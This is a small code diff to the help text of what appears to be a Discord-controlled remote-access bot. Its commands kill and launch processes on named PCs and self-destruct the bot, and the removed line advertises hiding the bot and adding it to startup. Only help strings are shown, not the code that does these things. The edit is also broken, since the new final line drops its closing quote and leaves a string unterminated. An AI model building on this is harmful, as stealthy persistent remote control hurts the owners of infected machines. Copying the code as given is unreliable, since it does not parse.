@@ -1138,8 +1138,7 @@ async def help_command(ctx):
             "`!killtask PC-Name ProcessName` - Kill a process\n"
             "`!startprocess PC-Name \"Path\"` - Start a process\n"
             "`!stop PC-Name` - Shutdown bot on this PC\n"
-            "`!kill PC-Name` - Completely remove bot (self-destruct)\n"
-            "`!autorun PC-Name` - Hide bot and add to startup"
+            "`!kill PC-Name` - Completely remove bot (self-destruct)
         ),
         inline=False
     )
